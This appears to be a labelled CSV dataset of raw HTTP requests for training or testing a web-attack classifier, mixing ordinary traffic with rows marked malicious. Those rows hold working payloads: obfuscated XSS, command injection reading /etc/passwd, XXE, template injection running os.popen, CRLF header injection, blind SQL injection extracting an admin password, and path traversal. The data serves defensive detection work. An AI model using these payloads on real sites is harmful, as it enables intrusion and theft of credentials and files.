label,text
benign,"PATCH /api/v1/settings HTTP/1.1
Host: workspace-central.app
Accept: */*
Content-Type: application/json-patch+json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
X-CSRF-Token: a12f9ba43fcef7e732daecc978234bc1
Connection: close
Content-Length: 79

[{""op"":""add"",""path"":""/privacy/blockTracking"",""value"":true},{""op"":""remove"",""path"":""/display/colorscheme""}]"
benign,"POST /customer/contact HTTP/1.1
Host: rapid-delivery-service.co
Content-Type: application/x-www-form-urlencoded
Content-Length: 128
Origin: https://rapid-delivery-service.co
Referer: https://rapid-delivery-service.co/contact
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.3 Safari/605.1.15
Cookie: sessionId=lxmw882jdhdne9cnwt73v4mr
Connection: keep-alive

name=Omar+Hassan&email=omar.hassan%40rds.co&subject=Delivery+options&message=Can+I+schedule+a+delivery+outside+normal+business+hours%3F+Thank+you."
benign,"GET /store/items/electronics HTTP/1.1
Host: urban-trend-shop.biz
Connection: keep-alive
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Cookie: SESSIONID=99821f3abd9f7e53a12; preferences=currency=usd&sort=popular; last_cart=tv_speaker_combo; visit_count=27"
benign,"PATCH /api/v1/settings HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: python-requests/2.31.0
Content-Type: application/json-patch+json
Authorization: Bearer wid91wqedpz8n4mv049fk3lsp
Content-Length: 67
Accept: application/json
DNT: 1
Connection: keep-alive

[{ ""op"": ""replace"", ""path"": ""/editor/autoSaveInterval"", ""value"": 300 }]"
malicious,"POST /contact_us/send HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 145
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36

name=John+Doe&email=john.doe%40secure-user-portal.net&message=%3Cscript%3Eeval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))%3C%2Fscript%3E"
benign,"OPTIONS /api/v2/items HTTP/1.1
Host: management.app-innovators.dev
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Accept: application/json
Access-Control-Request-Method: POST
Access-Control-Request-Headers: content-type, x-csrf-token
Origin: https://management.app-innovators.dev
Connection: keep-alive"
benign,"GET /products/electronics/4k-ultrawide-monitor HTTP/1.1
Host: nextgen-gadgets.store
Connection: keep-alive
Accept: text/html
Accept-Encoding: gzip, deflate
Accept-Language: es-ES,es;q=0.9,en;q=0.8
Referer: https://nextgen-gadgets.store/category/monitors
Cookie: cart_session=2a39tc7485dosa871zqx; session=41f2a7b9cd
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"
benign,"POST /api/log HTTP/1.1
Host: reports.client-insights.net
User-Agent: python-requests/2.31.0
Content-Type: application/json
Accept-Encoding: gzip, deflate
Content-Length: 294
Connection: close
X-CSRF-Token: e4b12bf3b19f7a1b1f4c1c5e0a2e9f93

{""event"":""user_registration"",""timestamp"":""2024-06-13T22:42:10Z"",""details"":{""userId"":""d9f3a1c3-8210-4cc0-b77c-2f2c4a3c2e4e"",""profile"":{""name"":{""first"":""Jane"",""last"":""Petrov""},""contacts"":{""email"":""jane.petrov@emailclient.net"",""phone"":""+1234567890""},""preferences"":{""newsletter"":true,""smsAlerts"":false}}}}"
benign,"POST /api/v1/messages/send HTTP/1.1
Host: communication-hub-server.net
Authorization: Bearer 3458ae78a514dcf2b86823fcb927bef0
Content-Type: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1
Accept: application/json
Connection: keep-alive
Content-Length: 172

{""recipientId"":7543,""message"":""SGVsbG8sIHRoaXMgaXMgYSBzYW1wbGUgbWVzc2FnZSBpbmNvcnBvcmF0ZWQgd2l0aCBpbi1saW5lIGJhc2U2NC4="",""timestamp"":""2024-06-06T09:30:45Z""}"
malicious,"GET /search?q=wireless+headphones HTTP/1.1
Host: online-retail-store.biz
X-Forwarded-Host: evil-tracking-domain.net
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Referer: https://online-retail-store.biz/"
benign,"GET /api/v3/weather/forecast?city=Stockholm&units=metric HTTP/1.1
Host: weatherhub-nordic.ai
User-Agent: curl/7.86.0
Accept: application/json
DNT: 1
Connection: close"
benign,"HEAD /index.html HTTP/1.1
Host: local-events-calendar.us
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: https://local-events-calendar.us/home
Cache-Control: no-cache"
benign,"POST /shop/cart/add-item HTTP/1.1
Host: online-retail-store.biz
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: https://online-retail-store.biz/products/electronics/headphones
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
Cookie: cart_id=xyz1234; user_token=def5678
Content-Length: 42

product_id=9853&quantity=2&promo_code=FALL20"
benign,"GET /config/app-settings.json HTTP/1.1
Host: secure-user-portal.net
Accept: application/json
Accept-Encoding: br, gzip, deflate
Accept-Language: en-US,en;q=0.8
Connection: close
User-Agent: python-requests/2.31.0
If-None-Match: ""db8c5c58a647c883b23a7fbd4beaa1f3"""
benign,"GET /favicon.ico HTTP/1.1
Host: online-retail-bazaar.biz
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.133 Mobile Safari/537.36
Accept: image/x-icon,image/vnd.microsoft.icon,*/*;q=0.6
Accept-Language: en-US,en;q=0.7
Connection: keep-alive"
malicious,"GET /api/v1/diagnostics/check?tool_option=verbose;%20cat%20/etc/passwd HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: application/json
Origin: https://online-retail-store.biz
Connection: keep-alive"
benign,"GET /home HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Cookie: user_prefs_b64=eyJ0aGVtZSI6ImRpZmZpY3VsdCIsImZvbnQiOiJBcmlhbCBCbGFjayJ9; session_id=XYfz23897hjsd87f
Connection: keep-alive"
benign,"GET /forum/thread/view?id=4521&title=C%23+beginners+%26+tips+%22easy+steps%22 HTTP/1.1
Host: community.game-dev-forum.org
Accept: text/html
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Referer: https://community.game-dev-forum.org/forum
Connection: keep-alive"
benign,"GET /catalog/items?query=kids+toys+%26+games&age_group=3-5+years HTTP/1.1
Host: bright-learning-zone.edu
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Language: en-US,en;q=0.5
Referer: https://bright-learning-zone.edu/home
Connection: keep-alive"
benign,"POST /user/profile/photo HTTP/1.1
Host: social-media-networking.appdevhub.co.uk
Content-Type: application/json
Authorization: Bearer x3kd029sdjwo293kd9fj2039dsj32k
Idempotency-Key: 7b92f56a-ab5e-4ed1-80cc-3aa4034f9831
X-Request-ID: 19eaf8b7-d30a-44ce-9f3c-c3136d5ba802
X-Client-Version: 4.0.0
Accept: application/json
Connection: keep-alive
User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.133 Mobile Safari/537.36

{
  ""photo_url"": ""https://cdn.appdevhub.co.uk/images/users/138529/photo.jpg"",
  ""thumbnail_url"": ""https://cdn.appdevhub.co.uk/images/users/138529/photo_thumb.jpg""
}"
benign,"GET /resource/load?file=downloads/setup/vpnclient_v5.9.2.dmg HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/604.1
Accept: application/octet-stream
Accept-Language: en-US,en;q=0.6
DNT: 1
Connection: keep-alive"
malicious,"POST /api/v3/items/search HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Accept: application/json
Content-Type: application/json
Content-Length: 40
Cache-Control: max-age=0
Connection: keep-alive

{""filePath"": ""/usr/local/apache2/conf/httpd.conf""}"
benign,"POST /user/register HTTP/1.1
Host: api.cloud-data-services.ai
Content-Type: application/x-www-form-urlencoded
Content-Length: 89
Connection: close
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Referer: https://api.cloud-data-services.ai/signup
Accept-Language: en-GB,en;q=0.8

email=jordan.smith%40mail.ai&password=Secr3tPass&redirect_uri=https%3A%2F%2Fapi.cloud-data-services.ai%2Fwelcome"
benign,"GET /api/v1/catalog/items?pageToken=VG9rZW5BYmM=&filters=eyJwcmljZSI6eyJtaW4iOjEsIm1heCI6MTAwMH0sInBhdGgiOiIvcHJvZHVjdHMvZWxlY3Ryb25pY3MifQ== HTTP/1.1
Host: shop-portal-cloud.net
Accept: application/json
Pragma: no-cache
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Connection: keep-alive"
benign,"GET /api/v2/user/profile/settings HTTP/1.1
Host: user-mgmt-cloud.io
Accept: application/json
X-Requested-With: XMLHttpRequest
Origin: https://dashboard.user-mgmt-cloud.io
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
malicious,"PUT /api/xml/processOrder HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Wget/1.21.1
Content-Type: application/xml
Accept-Language: en-US,en;q=0.9
Content-Length: 226

<?xml version=""1.0"" encoding=""ISO-8859-1""?>
<!DOCTYPE payload [
  <!ELEMENT payload ANY >
  <!ENTITY hidden SYSTEM ""file:///etc/hosts"" >
]>
<payload>
  <data>&hidden;</data>
  <flag>test</flag>
</payload>"
malicious,"GET /search/%7B%7B%20self.__init__.__globals__.__builtins__.__import__(%22os%22).popen(%22ls%20%2F%22).read()%20%7D%7D/results HTTP/1.1
Host: app-dashboard-vault.biz
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate
Connection: keep-alive"
malicious,"GET /search/results?search=%26lt%3Bscript%26gt;alert%28%27XSS_%20Vulnerability_Found%27%29%26lt%3B%2fscript%26gt; HTTP/1.1
Host: community.game-dev-forum.org
Connection: keep-alive
Accept: text/html,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.6
Referer: https://community.game-dev-forum.org/forums
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
benign,"GET /api/v2/search/products?category=toys&filter%5Bage_group%5D=3-5&filter%5Bbrand%5D=kiddos&sort_by=popularity_desc&page=8 HTTP/1.1
Host: playtime-delight.co
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: application/json
Referer: https://playtime-delight.co/toys
X-Requested-With: XMLHttpRequest
Connection: keep-alive"
benign,"GET /api/products/38422.xml HTTP/1.1
Host: global-auto-parts.net
Accept: application/xml
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept-Language: en
Cache-Control: no-cache"
malicious,"POST /session/start HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: application/json, text/plain, */*
Content-Type: application/json
Content-Length: 247
Origin: https://my-personal-blog-site.info
Connection: keep-alive

{""return_path"": ""/home%0d%0aX-Frame-Options:%20DENY%0d%0aLocation:%20http://evil-redirect.my-personal-blog-site.info%0d%0a%0d%0a<html><body>Injected content</body></html>""}"
malicious,"GET /api/v3/items/search HTTP/1.1
Host: cloud-data-service-global.dev
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: application/json
X-Security-Override: true
Referer: https://dashboard.cloud-data-service-global.dev/home
Connection: close"
benign,"GET /search/articles?query=history%20of%20renaissance%20art%20and%20its%20impact%20on%20modern%20culture%20including%20key%20artists%20like%20da%20Vinci%2C%20Michelangelo%2C%20and%20Raphael%20covering%20paintings%2C%20sculptures%2C%20and%20architectural%20works HTTP/1.1
Host: cultural-insights.ai
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
malicious,"GET /api/v2/data/export HTTP/1.1
Host: fast-data-pipelines.io
User-Agent: ExportTool/9.0 `uname -a`
Accept: application/json
Accept-Encoding: gzip, deflate
Origin: https://dashboard.fast-data-pipelines.io
Cache-Control: max-age=0"
benign,"GET /robots.txt HTTP/1.1
Host: media-streaming-hub.tv
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/plain, */*; q=0.01
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
benign,"OPTIONS /update/user/6152/profile HTTP/1.1
Host: user-management.api-global.cloud
Origin: https://secure-login.clientportal.org
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: content-type, x-custom-header, x-api-key
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0
Accept-Encoding: gzip, deflate
Cache-Control: no-cache
Connection: close"
benign,"POST /account/authenticate HTTP/1.1
Host: secure-cloud-base.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 61
Referer: https://secure-cloud-base.net/account/login
Origin: https://secure-cloud-base.net
Cookie: auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9; csrf=9928a2e3
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15

email=marcella.prince%40hotmail.com&password=SunSetP@ss#123"
malicious,"GET /out?target=data:text/html;base64,PHNjcmlwdD5hbGVydCgnUmVkaXJlY3RlZCEgWFNTJyk8L3NjcmlwdD4= HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Connection: keep-alive
Origin: https://app.cloud-data-services.ai"
benign,"GET /download/report/Q2-Financials-2024.pdf HTTP/1.1
Host: business-analytics-suite.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept: application/pdf
Accept-Language: en-US,en;q=0.8
Referer: https://corporate-planning.io/reports/quarterly/
Range: bytes=0-1048575
Connection: keep-alive"
malicious,"GET /app/validate?input=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab123 HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Wget/1.20
Accept-Encoding: br, gzip, deflate
Referer: https://community.game-dev-forum.org/app
Cache-Control: max-age=0"
benign,"POST /user/account/forgot_password HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/112.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Connection: keep-alive
Cache-Control: max-age=0

email=natalie.foster%40online-retail-store.biz"
benign,"GET /favicon.ico HTTP/1.1
Host: easy-repair-services.jp
Connection: keep-alive
Accept: image/x-icon,image/vnd.microsoft.icon,*/*;q=0.7
Accept-Language: ja,en-US;q=0.8,en;q=0.7
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1"
malicious,"GET /custom_page?preview_text=%7B%7B%207*%277%27%20%7D%7D HTTP/1.1
Host: user-content-hub.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive"
malicious,"POST /profile/update HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 169
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: */*
Cache-Control: no-cache
Pragma: no-cache

user=devMike&bio=Game+developer+and+enthusiast&message=%3Cscript%3Eeval(String.fromCharCode(97%2C108%2C101%2C114%2C116%2C40%2C39%2C88%2C83%2C83%2C39%2C41))%3C%2Fscript%3E"
malicious,"POST /app/user/settings HTTP/1.1
Host: portal.dynamic-shoppe.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
User-Agent: curl/7.77.0
Accept: */*
Accept-Encoding: deflate, gzip
Cookie: lang=en-US; tracking_id=0x31323327 OR IF(ASCII(SUBSTRING((SELECT/**/password/**/FROM/**/users/**/WHERE/**/username='admin'),1,1))=0x61,SLEEP(5),0)#; sessionid=abcd1234

theme=dark&notifications=enabled"
benign,"GET /api/v3/items/search?id=search_batch_0112 HTTP/1.1
Host: inventory-management.cloud
Connection: keep-alive
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate, br
DNT: 1
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
X-Requested-With: XMLHttpRequest"
benign,"HEAD /index.html HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Accept: text/html
Accept-Encoding: gzip, deflate
Connection: keep-alive
DNT: 1"
benign,"OPTIONS /resources/inventory/3379/delete HTTP/1.1
Host: cloud-supply-chain.biz
Origin: https://dashboard.retailcloudapps.dev
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: authorization, content-type
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Mobile Safari/537.36
Accept: */*
Connection: keep-alive"
